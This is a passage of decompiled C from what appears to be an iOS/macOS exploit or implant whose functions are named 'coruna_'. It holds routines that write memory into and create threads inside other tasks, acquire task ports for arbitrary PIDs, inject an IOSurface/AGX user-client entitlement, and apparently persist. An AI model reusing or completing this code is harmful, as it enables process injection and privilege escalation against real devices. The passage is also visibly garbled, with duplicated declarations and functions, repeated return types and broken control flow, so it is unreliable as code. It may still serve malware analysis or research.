        if (lk1 != 0) {
          err = lk1;
        }
        arg_x = arg_x + dataCnt;
        size = size - dataCnt;
      } while (size != 0);
      size = 0;
      if (err != 0) {
        size = 0x1e00f;
      }
      _free(data);
    }
  }
  return size;
}





uint64_t
uint64_t coruna_mach_vm_write_24614(short *arg,int64_t arg_x,vm_map_t arg_x_x,int flags,uint64_t val, uint64_t *id_2,uint64_t size_3,uint size)
{
  uint u;
  int err;
  kern_return_t lk3;
  uint32_t size;
  uint64_t version;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t action;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t stack_guard;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_saved;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  unsigned long sa_new;
  long path_buf;
  unsigned long tmp_buf;
  uint64_t cache_22;
  uint64_t region;
  uint64_t plist;
  uint8_t *url_buf;
  uint32_t json_buf;
  long frame;
  
  frame = *(long *)k_persist_stack_chk_guard_slot;
  version = 0xad00a;
  if (((arg != (short *)0x0) && (*arg == 2)) && (1 < (ushort)arg[1] && arg_x != 0)) {
    version = 0x1e011;
    if (arg_x_x + 1 < 2) {
      version = 0x1e009;
    }
    else if (flags + 1U < 2) {
      version = 0x1e014;
    }
    else {
      err = coruna_port_name_valid(id_2,val);
      if (err == 0) {
        version = 0x1e010;
      }
      else if (((size_3 != 0) &&
               (((uint)(size_3 >> 0x20 != 0) & ((uint)val ^ 0xffffffff)) == 0)) &&
              (0x24f < size)) {
        path_buf = 0;
        sa_new = 0;
        cache_22 = 0;
        tmp_buf = 0;
        cache = 0;
        sa_saved = 0;
        cache_21 = 0;
        cache_20 = 0;
        json_buf = 0;
        stack_guard = 0;
        work = 0;
        frame = 0;
        region = 0;
        block_ctx = 0;
        url_buf = 0;
        plist = 0;
        sa_new = 0;
        action = 0;
        tmp_buf = 0;
        path_buf = 0;
        block_ctx = 0;
        serial_buf = 0;
        sa_saved = 0;
        stack_guard = 0;
        action = 0;
        serial_buf = 0;
        bootargs = 0;
        bootargs = 0;
        thread_attr = 0;
        thread_attr = 0;
        if ((uint)val == 0) {
          region = coruna_u64_pack(((int)id_2[7]), (int)id_2[6]);
          plist = coruna_u64_pack(((int)id_2[9]), (int)id_2[8]);
          u = (size + (int)size_3) - 0x110;
          scratch = coruna_u64_pack(((int)id_2[3]), (int)id_2[2]);
          scratch = coruna_u64_pack(((int)id_2[5]), (int)id_2[4]);
          host_info = (unsigned long)u << 0x20;
          size = (uint32_t)*id_2;
          host_info = NEON_rev64(coruna_u64_pack(((int)id_2[1]), (size)),4);
          if ((*id_2 & 1) != 0) {
            host_info = coruna_u64_pack((size), ((uint32_t))host_info) & 0xfffffffeffffffff;
            serial_buf = 0x20;
          }
          lk3 = _mach_vm_write(arg_x_x,(unsigned long)u,(vm_offset_t)&region,0x10);
          if (lk3 != 0) {
            version = 0x1e00e;
            if (*(long *)k_persist_stack_chk_guard_slot == frame) {
            return version;
            }
            ___stack_chk_fail();
          }
          json_buf = 0x11;
          size = 1;
        }
        else {
          path_buf = size_3 + size + -0x180;
          scratch = id_2[3];
          scratch = id_2[2];
          bootargs = id_2[5];
          bootargs = id_2[4];
          thread_attr = id_2[7];
          thread_attr = id_2[6];
          host_info = id_2[9];
          host_info = id_2[8];
          tmp_buf = *id_2;
          if ((tmp_buf != 0) && (tmp_buf == 0)) {
            tmp_buf = 0;
          }
          sa_new = id_2[1];
          if ((sa_new != 0) && (sa_new == 0)) {
            sa_new = 0;
          }
          json_buf = 0x44;
          size = 6;
        }
        region = coruna_u64_pack((flags), (arg_x_x));
        plist = coruna_u64_pack((plist), (size));
        url_buf = (uint8_t *)&scratch;
        version = (**(void (**)(arg + 0x14))(arg,arg_x,0x4000001e,&region);
      }
    }
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == frame) {
    return version;
  }
  ___stack_chk_fail();
}





bool coruna_port_name_valid(unsigned long *arg,uint size)
{
  unsigned long u;
  
  if (arg != (unsigned long *)0x0) {
    u = *arg;
    if (u == 0) {
      return false;
    }
    if ((size & 1) != 0) {
      return u != 0;
    }
    if ((((((u >> 0x20 == 0) && (*(int *)((long)arg + 0xc) == 0)) &&
          (*(int *)((long)arg + 0x14) == 0)) &&
         ((*(int *)((long)arg + 0x1c) == 0 && (*(int *)((long)arg + 0x24) == 0)))) &&
        ((*(int *)((long)arg + 0x2c) == 0 &&
         ((*(int *)((long)arg + 0x34) == 0 && (*(int *)((long)arg + 0x3c) == 0)))))) &&
       (*(int *)((long)arg + 0x44) == 0)) {
      return *(int *)((long)arg + 0x4c) == 0;
    }
  }
  return false;
}





uint64_t
uint64_t coruna_thread_create_resume(short *arg,int64_t arg_x,uint64_t val,uint64_t id_2,uint64_t size_3, uint64_t off_4,uint64_t off_5)
{
  int err;
  kern_return_t lk2;
  uint64_t u;
  thread_act_t scratch [3];
  
  if (arg == (short *)0x0) {
    return 0xad00a;
  }
  if (*arg != 2) {
    return 0xad00a;
  }
  if ((ushort)arg[1] < 2 || arg_x == 0) {
    return 0xad00a;
  }
  if ((task_t)val + 1 < 2) {
    return 0x1e009;
  }
  err = coruna_port_name_valid(size_3,id_2);
  if (err == 0) {
    return 0x1e010;
  }
  if (off_4 == 0) {
    return 0x1e011;
  }
  if (((uint)(off_4 >> 0x20 != 0) & ((uint)id_2 ^ 0xffffffff)) != 0) {
    return 0x1e011;
  }
  if ((uint)off_5 < 0x250) {
    return 0x1e011;
  }
  scratch[0] = 0;
  lk2 = _thread_create((task_t)val,scratch);
  if (lk2 != 0) {
    return 0x1e00c;
  }
  if (scratch[0] + 1 < 2) {
    return 0x1e00c;
  }
  u = coruna_mach_vm_write_24614(arg,arg_x,val,scratch[0],id_2,size_3,off_4,off_5);
  if ((int)u == 0) {
    scratch[1] = 0x7f;
    if (1 < scratch[0] + 1) {
      _thread_policy_set(scratch[0],3,(thread_policy_t)(scratch + 1),1);
    }
    lk2 = _thread_resume(scratch[0]);
    if (lk2 == 0) {
      u = 0;
      _mach_port_deallocate(*(ipc_space_t *)k_persist_mach_task_self_slot,scratch[0]);
      return u;
    }
    u = 0x1e013;
  }
  _thread_terminate(scratch[0]);
code_r0x0000f9f4:
  _mach_port_deallocate(*(ipc_space_t *)k_persist_mach_task_self_slot,scratch[0]);
  return u;
}





void coruna_task_for_pid(long *handle,int flags,uint32_t *size)
{
  pid_t lp1;
  uint64_t u;
  uint32_t size;
  int scratch;
  uint32_t bootargs;
  uint32_t thread_attr[2];
  uint8_t *host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_persist_stack_chk_guard_slot;
  u = 0xad001;
  if (((handle != (long *)0x0) && (0 < flags)) && (size != (uint32_t *)0x0)) {
    lp1 = _getpid();
    if (lp1 == flags) {
      u = 0;
      size = *(uint32_t *)k_persist_mach_task_self_slot;
    }
    else {
      bootargs = 0;
      thread_attr[0] = 0xc000001d;
      scratch = flags;
      host_info = (uint8_t *)&scratch;
      u = (**(void (**)(*handle + 0x40))(*handle,handle + 1,thread_attr,1,0);
      size = bootargs;
      if (*(long *)k_persist_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail(u);
      }
      return;
    }
    *size = size;
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}





unsigned long coruna_apply_iosurface_entitlement(long *arg,uint val)

{
  uint u;
  int j;
  unsigned long version;
  int *status;
  uint *obj;
  unsigned long tag;
  long ctx_val;
  long addr;
  uint json_buf;
  uint32_t cache_74;
  char *frame;
  uint64_t work;
  size_t cache;
  int cache_76;
  long cache_80;
  uint32_t cache_81[2];
  unsigned long cache_54;
  uint32_t cache_82;
  unsigned long host_info;
  uint32_t serial_buf;
  unsigned long cache_20;
  uint32_t block_ctx;
  unsigned long scratch;
  uint32_t thread_attr[2];
  uint *cache_78;
  long cache_79;
  
  cache_79 = *(long *)k_persist_stack_chk_guard_slot;
  tag = 0xad001;
  version = tag;
  if (((arg != (long *)0x0) && (val != 0)) && (val != 0xffffffff)) {
    cache_81[0] = 0x15;
    cache_54 = (unsigned long)val;
    cache_82 = 0x1f;
    serial_buf = 0x22;
    block_ctx = 0x17;
    host_info = cache_54;
    cache_20 = cache_54;
    scratch = cache_54;
    version = (**(void (**)(*arg + 0x40))(*arg,arg + 1,cache_81,4,0);
    if ((int)version == 0) {
      ctx_val = *arg;
      if ((ctx_val == 0) || (addr = arg[1], addr == 0)) {
        version = 0xad001;
      }
      else {
        cache_74 = 0;
        json_buf = val;
        version = (**(void (**)(ctx_val + 0x28))(ctx_val,addr,0xc000001b,&json_buf);
        if ((int)version == 0) {
          u = cache_74 >> 0x18;
          cache_74 = cache_74 & 0xffffff00;
          if (k_persist_rodata_word_1efc0 <= *(double *)k_persist_dyldversionnumber_slot) {
            cache_74 = coruna_cat(1,(uint16_t)cache_74);
            cache_74 = coruna_cat((char)u,(uint32_t)cache_74);
          }
          version = (**(void (**)(ctx_val + 0x28))(ctx_val,addr,0x4000001b,&json_buf);
          if ((int)version == 0) {
            ctx_val = *arg;
            cache_80 = arg[1];
            version = tag;
            if ((ctx_val != 0) && (cache_80 != 0)) {
              cache_76 = 0;
              cache = 4;
              j = _sysctlbyname("hw.cpufamily",&cache_76,&cache,(void *)0x0,0);
              if (j == 0) {
                if (cache_76 == 0x1b588bb3) {
                  frame = 
                  "<dict><key>com.apple.security.iokit-user-client-class</key><array><string>IOSurfaceRootUserClient</string><string>AGXDeviceUserClient</string></array></dict>"
                  ;
                  work = k_persist_rodata_word_1efc8;
                  thread_attr[0] = 0x40000010;
                  cache_78 = &json_buf;
                  json_buf = val;
                  version = (**(void (**)(ctx_val + 0x40))(ctx_val,&cache_80,thread_attr,1,0);
                }
                else {
                  version = 0;
                }
              }
              else {
                status = ___error();
                j = *status;
                obj = (uint *)___error();
                u = -*obj;
                if (-1 < j) {
                  u = *obj;
                }
                version = (unsigned long)(u | 0x40000000);
              }
            }
          }
        }
      }
    }
  }
  if (*(long *)k_persist_stack_chk_guard_slot == cache_79) {
    return version;
  }
  ___stack_chk_fail();
}





int coruna_rwlock_iface_destroy(long *handle)
{
  int err;
  int status;
  
  if (handle == (long *)0x0) {
    status = 0xad001;
  }
  else {
    if (handle[1] == 0) {
      status = 0;
    }
    else {
      err = (**(void (**)(*handle + 0x30))();
      status = (**(void (**)(*handle + 0x20))(*handle,handle[1]);
      if (err != 0) {
        status = err;
      }
    }
    *handle = 0;
    handle[1] = 0;
    _free(handle);
  }
  return status;
}





uint64_t
uint64_t coruna_persist_via_mach_msg(int64_t arg,uint size,uint64_t val,uint64_t id_2,uint64_t size_3, uint64_t off_4,uint64_t off_5)
{
  bool err;
  uint64_t u;
  int err;
  
  if (arg == 0) {
    u = 4;
  }
  else {
    u = coruna_mach_msg(arg,size & 0xfffffbbf);
    if ((int)u != 0) {
      if (((size >> 6 & 1) == 0) && ((int)u == 0x10000007)) {
        err = -0xfff;
        do {
          u = coruna_mach_msg(arg,size & 0xfffffbbf,val,id_2,size_3,off_4,off_5)
          ;
          if ((int)u != 0x10000007) break;
          err = err != 0;
          err = err + 1;
        } while (err);
      }
      if (((size >> 10 & 1) == 0) && ((int)u == 0x10004005)) {
        err = -0xfff;
        do {
          u = coruna_mach_msg(arg,size & 0xfffffbbe,0,id_2,size_3,off_4,off_5);
          if ((int)u != 0x10004005) {
            return u;
          }
          err = err != 0;
          err = err + 1;
        } while (err);
      }
    }
  }
  return u;
}





uint64_t
uint64_t coruna_persist_via_mach_msg2(int64_t arg,uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, uint64_t off_5,uint64_t off_6,uint64_t off_7)
{
  bool err;
  uint64_t u;
  int err;
  
  if (arg == 0) {
    u = 4;
  }
  else {
    u = coruna_mach_msg2();
    if ((int)u != 0) {
      if ((((uint)val >> 6 & 1) == 0) && ((int)u == 0x10000007)) {
        err = -0xfff;
        do {
          u = coruna_mach_msg2(arg,val & 0xfffffffffffffbbf,id_2,size_3,off_4,off_5,
                               off_6,off_7);
          if ((int)u != 0x10000007) break;
          err = err != 0;
          err = err + 1;
        } while (err);
      }
      if ((((uint)val >> 10 & 1) == 0) && ((int)u == 0x10004005)) {
        err = -0xfff;
        do {
          u = coruna_mach_msg2(arg,val & 0xfffffffffffffbbe,id_2 & 0xffffffff,size_3,
                               off_4,off_5,off_6,off_7);
          if ((int)u != 0x10004005) {
            return u;
          }
          err = err != 0;
          err = err + 1;
        } while (err);
      }
    }
  }
  return u;
}





long coruna_memcpy(long handle,long addr_2,unsigned long arg)
{
  unsigned long scratch;
  
  if (((handle != 0) && (addr_2 != 0)) && (arg != 0)) {
    for (scratch = 0; scratch < arg; scratch = scratch + 1) {
      *(uint8_t *)(handle + scratch) = *(uint8_t *)(addr_2 + scratch);
    }
  }
  return handle;
}





long coruna_memset(long handle,uint8_t buf,unsigned long arg)
{
  unsigned long scratch;
  
  if ((handle != 0) && (arg != 0)) {
    for (scratch = 0; scratch < arg; scratch = scratch + 1) {
      *(uint8_t *)(handle + scratch) = buf;
    }
  }
  return handle;
}
unsigned long coruna_persist_via_memcpy(unsigned long arg,uint val,long n,uint *m,int p)

{
  uint u;
  uint size;
  int count;
  unsigned long type_id;
  uint64_t cache_83;
  uint64_t cache_32;
  uint64_t cache_84;
  uint32_t cache_85;
  uint cache_86;
  uint cache_87;
  uint8_t cache_88[372];
  uint cache_89;
  
  type_id = 4;
  if ((((n != 0) && (m != (uint *)0x0)) && (count = (int)arg, count != 0)) &&
     (count != -1)) {
    cache_89 = 0;
    cache_32 = k_persist_rodata_word_0001f000;
    cache_83 = k_persist_rodata_word_1eff8;
    cache_84 = k_persist_rodata_word_1f008;
    type_id = coruna_mach_port_construct(arg,&cache_83,0,&cache_89);
    size = cache_89;
    if ((int)type_id == 0) {
      if (cache_89 + 1 < 2) {
        type_id = 0x11;
      }
      else {
        coruna_memset(&cache_83,0,400);
        cache_84 = coruna_u64_pack((0xd4d), ((uint32_t))cache_84);
        cache_85 = 0x100;
        cache_87 = *m;
        if (0x59 < cache_87) {
          cache_87 = 0x5a;
        }
        cache_83 = k_persist_rodata_word_1eff0;
        cache_32 = coruna_u64_pack((size), (count));
        cache_86 = val;
        if (p == 0) {
          type_id = coruna_persist_via_mach_msg(&cache_83,3,0x28,400,size,0,0);
        }
        else {
          type_id = coruna_persist_via_mach_msg2(&cache_83,0x200000003,0x2800001513,
                               arg & 0xffffffff | (unsigned long)size << 0x20,0xd4d00000000,
                               (unsigned long)size << 0x20,400,0);
        }
        if ((int)type_id == 0) {
          if (cache_84 == 0x47) {
            type_id = 0xfffffecc;
          }
          else if (cache_84 == 0xdb1) {
            type_id = 0xfffffed4;
            if (-1 < (int)cache_83) {
              if (((0x27 < cache_83) && (cache_83 < 0x191)) &&
                 (type_id = (unsigned long)cache_86, cache_86 == 0)) {
                if ((cache_87 < 0x5b) &&
                   ((unsigned long)cache_87 * 4 - (unsigned long)(cache_83 - 0x28) == 0)) {
                  u = *m;
                  if (u < cache_87) {
                    if (u != 0) {
                      coruna_memcpy(n,cache_88,(unsigned long)u << 2);
                    }
                    *m = cache_87;
                    type_id = 0xfffffecd;
                  }
                  else {
                    coruna_memcpy(n,cache_88);
                    type_id = 0;
                    *m = cache_87;
                  }
                }
                else {
                  type_id = 0xfffffed4;
                }
              }
            }
          }
          else {
            type_id = 0xfffffed3;
          }
        }
        coruna_mach_port_mod_refs(arg,size,1,0xffffffff);
      }
    }
  }
  return type_id;
}





uint coruna_driver_copy_port_1918(char *path,char *str_2)
{
  char err;
  char status;
  uint u;
  
  if (path == (char *)0x0) {
    return 1;
  }
  if (str_2 != (char *)0x0) {
    do {
      err = *path;
      status = *str_2;
      path = path + 1;
      str_2 = str_2 + 1;
    } while (err != '\0' && err == status);
    u = 0xffffffff;
    if (status <= err) {
      u = (uint)(status < err);
    }
    return u;
  }
  return 0xffffffff;
}





long coruna_driver_free_ctx(long handle)
{
  long handle;
  long addr;
  
  addr = 0;
  if (handle != 0) {
    handle = 0;
    do {
      addr = handle;
      handle = addr + 1;
    } while (*(char *)(handle + addr) != '\0');
  }
  return addr;
}





uint64_t coruna_ctx_free_slot(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_ctx(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_persist_residual_45(long handle,int flags,uint64_t *val)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    if (flags != 0) {
      return 0x1e028;
    }
    u = 0;
    *val = 0xdeaddead;
  }
  return u;
}





uint32_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint32_t u;
  
  u = 0;
  if (addr_2 != 0xdeaddead || handle == 0) {
    u = 0xad001;
  }
  return u;
}





uint64_t coruna_surface_dispatch_thunk(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 == 0xdeaddead)) {
    u = coruna_persist_via_port_extract_right(*(uint64_t *)(handle + 8),val,id_2);
    return u;
  }
  return 0xad001;
}





int coruna_msu_mnt1_path(long handle,long *addr_2,long off_3,uint size,unsigned long arg)
{
  int err;
  int status;
  uint64_t u;
  unsigned long size;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((((handle != 0) && (addr_2 != (long *)0x0)) && ((off_3 != 0 || (size == 0)))) &&
     (*addr_2 == 0xdeaddead || *addr_2 == 0)) {
    if (size != 0) {
      u = *(uint64_t *)(handle + 8);
      size = (unsigned long)size;
      ptr = (uint64_t *)(off_3 + 8);
      status = 0;
      do {
        if (((arg & 1) == 0) && (status != 0)) {
          return status;
        }
        err = coruna_persist_via_port_extract_right(u,*(uint32_t *)(ptr + -1),*ptr);
        if (status != 0) {
          err = status;
        }
        size = size - 1;
        ptr = ptr + 2;
        status = err;
      } while (size != 0);
      if (err != 0) {
        return err;
      }
    }
    status = 0;
    *addr_2 = 0xdeaddead;
  }
  return status;
}





uint32_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint32_t u;
  
  u = 0;
  if (addr_2 != 0xdeaddead || handle == 0) {
    u = 0xad001;
  }
  return u;
}





uint32_t coruna_free_ctx(long handle,long addr_2,long off_3)
{
  uint32_t u;
  
  u = 0x1e028;
  if ((off_3 == 0 || addr_2 != 0xdeaddead) || handle == 0) {
    u = 0xad001;
  }
  return u;
}





uint32_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint32_t u;
  
  u = 0x1e028;
  if (addr_2 == 0 || handle == 0) {
    u = 0xad001;
  }
  return u;
}





uint64_t coruna_macho_iface_create(long handle,uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      *(long *)(ptr + 2) = handle;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_slot;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_persist_residual_45;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_dyld_port_index;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_surface_dispatch_thunk;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_dyld_port_index;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_msu_mnt1_path;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_dyld_port_index;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_mach_port_mod_refs_1068c(uint64_t *val,mach_port_name_t arg,uint32_t size)
{
  kern_return_t lk1;
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (arg + 1 < 2) {
      u = 0x1e027;
    }
    else {
      ptr = _calloc(1,0x14);
      if (ptr == (uint32_t *)0x0) {
        u = 0xad009;
      }
      else {
        lk1 = _mach_port_mod_refs(*(ipc_space_t *)k_persist_mach_task_self_slot,arg,0,1);
        if (lk1 == 0) {
          u = 0;
          *ptr = size;
          ptr[1] = arg;
          *(uint64_t *)(ptr + 2) = 0x753000007530;
          ptr[4] = 0;
          *val = ptr;
        }
        else {
          _free(ptr);
          u = 0x1e01b;
        }
      }
    }
  }
  return u;
}





uint64_t coruna_mach_port_deallocate_1075c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if (1 < *(mach_port_name_t *)((long)val + 4) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_persist_mach_task_self_slot,
                 *(mach_port_name_t *)((long)val + 4));
    }
    if (1 < *(mach_port_name_t *)(val + 2) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_persist_mach_task_self_slot,*(mach_port_name_t *)(val + 2));
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





int coruna_persist_via_port_extract_right(long handle,unsigned long arg,unsigned long *arg)
{
  uint32_t u;
  int err;
  uint size;
  uint32_t version;
  int *err;
  int scratch;
  int bootargs;
  unsigned long thread_attr;
  unsigned long *host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long action;
  
  if (handle == 0) {
    return 0xad001;
  }
  scratch = 0xad00b;
  err = (int)arg;
  if (0x40000003 < err) {
    if (err < 0x40000012) {
      if (err + 0xbffffffcU < 2) {
        size = 3;
        if (err == 0x40000005) {
          size = 4;
        }
        arg = (unsigned long)size;
        version = *(uint32_t *)k_persist_mach_task_self_slot;
        host_info = arg;
fail:
        thread_attr = coruna_u64_pack((thread_attr), (version));
        serial_buf = 0;
        version = *(uint32_t *)(handle + 8);
        arg = &thread_attr;
      }
      else {
        if (1 < err + 0xbffffff0U) {
          if (err != 0x4000000e) {
            return 0x1e028;
          }
          version = 1;
          if (err != 0x4000000e) {
          version = 2;
          }
          u = *(uint32_t *)(handle + 8);
          }
          else {
          version = 10;
          if (err != -0x3fffffdd) {
          version = 0xb;
          }
          err = coruna_abort(handle,version,arg,*(uint32_t *)(handle + 8),&scratch);
          if (err != 0) {
          scratch = err;
          }
          return scratch;
        }
        size = 3;
        if (err == 0x40000010) {
          size = 4;
        }
        arg = (unsigned long)size;
        version = *(uint32_t *)(handle + 8);
      }
      err = coruna_persist_via_port_extract_right_2(handle,arg,arg,version,&scratch);
    }
    else {
      if (err == 0x40000012) {
done:
        version = 1;
        if (err != 0x4000000e) {
          version = 2;
        }
        u = *(uint32_t *)(handle + 8);
      }
      else {
        version = 10;
        if (err != -0x3fffffdd) {
        version = 0xb;
        }
        err = coruna_abort(handle,version,arg,*(uint32_t *)(handle + 8),&scratch);
        if (err != 0) {
        scratch = err;
        }
        return scratch;
        if (err != 0x40000021) {
          return 0x1e028;
        }
        u = *(uint32_t *)(handle + 8);
        version = 9;
      }
      err = coruna_is_asl_symbol(handle,version,arg,u,&scratch);
    }
    if (err != 0) {
    scratch = err;
    }
    return scratch;
  }
  if (err < 0xc) {
    if (err < 3) {
      if (err == -0x7fffffe4) {
        if (arg == (unsigned long *)0x0) {
          return 0xad001;
        }
        bootargs = 0xad00b;
        err = (int *)(handle + 0x10);
        if (*err + 1U < 2) {
          scratch = 0;
          serial_buf = 0;
          bootargs = 0;
          host_info = (unsigned long *)0x0;
          thread_attr = 8;
          action = (unsigned long)*(uint *)k_persist_mach_task_self_slot;
          err = coruna_port_extract_right(handle,&thread_attr,*(uint32_t *)(handle + 8),&bootargs,err,0);
          if (err != 0) {
          scratch = err;
          }
          return scratch;
        }
        else {
          bootargs = 0;
        }
        err = 0;
        *(int *)arg = *err;
        scratch = bootargs;
        if (err != 0) {
        scratch = err;
        }
        return scratch;
      }
      if (err != -0x3fffffdd) {
        return 0x1e028;
      }
cleanup:
      version = 10;
      if (err != -0x3fffffdd) {
        version = 0xb;
      }
      err = coruna_abort(handle,version,arg,*(uint32_t *)(handle + 8),&scratch);
      if (err != 0) {
      scratch = err;
      }
      return scratch;
    }
    if (err == 3) {
      version = *(uint32_t *)k_persist_mach_task_self_slot;
      host_info = (unsigned long *)0x1f638;
      thread_attr = coruna_u64_pack((thread_attr), (version));
      serial_buf = 0;
      version = *(uint32_t *)(handle + 8);
      arg = &thread_attr;
      }
      else {
      if (1 < err + 0xbffffff0U) {
      if (err != 0x4000000e) {
      return 0x1e028;
      }
      version = 1;
      if (err != 0x4000000e) {
      version = 2;
      }
      u = *(uint32_t *)(handle + 8);
      }
      else {
      version = 10;
      if (err != -0x3fffffdd) {
      version = 0xb;
      }
      err = coruna_abort(handle,version,arg,*(uint32_t *)(handle + 8),&scratch);
      if (err != 0) {
      scratch = err;
      }
      return scratch;
      }
      size = 3;
      if (err == 0x40000010) {
      size = 4;
      }
      arg = (unsigned long)size;
      version = *(uint32_t *)(handle + 8);
      }
      err = coruna_persist_via_port_extract_right_2(handle,arg,arg,version,&scratch);
      }
      else {
      if (err == 0x40000012) {
      version = 1;
      if (err != 0x4000000e) {
      version = 2;
      }
      u = *(uint32_t *)(handle + 8);
      }
      else {
      version = 10;
      if (err != -0x3fffffdd) {
      version = 0xb;
      }
      err = coruna_abort(handle,version,arg,*(uint32_t *)(handle + 8),&scratch);
      if (err != 0) {
      scratch = err;
      }
      return scratch;
    }
    if (err != 9) {
      return 0x1e028;
    }
skip:
    version = *(uint32_t *)(handle + 8);
    size = 7;
  }
  else {
    if (0x15 < err) {
      if (err == 0x16) {
        version = *(uint32_t *)(handle + 8);
        size = 6;
      }
      else if (err == 0x1a) {
        version = *(uint32_t *)(handle + 8);
        size = 7;
      }
      else {
        return 0x1e028;
      }
    }
    if (err == 0xc) {
      version = *(uint32_t *)(handle + 8);
      size = 5;
    }
    else {
      if (err != 0xd) {
        return 0x1e028;
      }
next:
      version = *(uint32_t *)(handle + 8);
      size = 6;
    }
  }
  bootargs = 0;
  scratch = 0;
  serial_buf = 0;
  host_info = (unsigned long *)0x0;
  thread_attr = (unsigned long)size;
  size = (uint)arg;
  if (size == 0) {
    size = *(uint *)k_persist_mach_task_self_slot;
  }
  action = (unsigned long)size;
  err = coruna_port_extract_right(handle,&thread_attr,version,&scratch,0,0);
check_ok:
  if (err != 0) {
    scratch = err;
  }
  return scratch;
}





uint64_t
uint64_t coruna_is_asl_symbol(int64_t arg,uint32_t size,int *flags,uint64_t val,int64_t arg)
{
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t *thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  int block_ctx;
  uint8_t stack_guard;
  
  u = 0xad001;
  if (((arg != 0) && (flags != (int *)0x0)) && (arg != 0)) {
    bootargs = *(uint64_t *)(flags + 4);
    action = *(uint64_t *)(flags + 2);
    block_ctx = flags[6];
    stack_guard = (uint8_t)flags[7];
    bootargs = 0x18;
    thread_attr = &action;
    host_info = 0;
    scratch = 0;
    serial_buf = *flags;
    if (serial_buf == 0) {
      serial_buf = *(int *)k_persist_mach_task_self_slot;
    }
    scratch[0] = size;
    u = coruna_port_extract_right(arg,scratch,val,arg,0,0);
  }
  return u;
}
uint coruna_port_extract_right(int *flags,int *count_2,mach_msg_timeout_t arg,int *fd_3,
                 mach_port_name_t *arg_x,long handle)
{
  bool err;
  mach_port_t *lpm2;
  uint u;
  uint size;
  mach_msg_return_t lm5;
  kern_return_t lk6;
  mach_msg_header_t *msg;
  int err;
  mach_port_name_t lm8;
  unsigned long version;
  unsigned long port;
  ipc_space_t *err;
  mach_msg_header_t *scratch;
  mach_port_name_t bootargs;
  mach_msg_type_name_t thread_attr;
  mach_port_t host_info;
  mach_msg_header_t serial_buf;
  int action;
  uint64_t scratch;
  uint block_ctx;
  uint32_t bootargs;
  int stack_guard;
  uint64_t sa_saved;
  uint64_t thread_attr;
  uint64_t sa_new;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t path_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t tmp_buf;
  uint64_t sa_new;
  uint64_t region;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t url_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t json_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t frame;
  uint64_t cache_23;
  uint64_t cache_24;
  uint32_t cache_25;
  uint32_t work;
  uint32_t cache_26;
  uint64_t cache_27;
  long cache;
  
  err = (ipc_space_t *)k_persist_mach_task_self_slot;
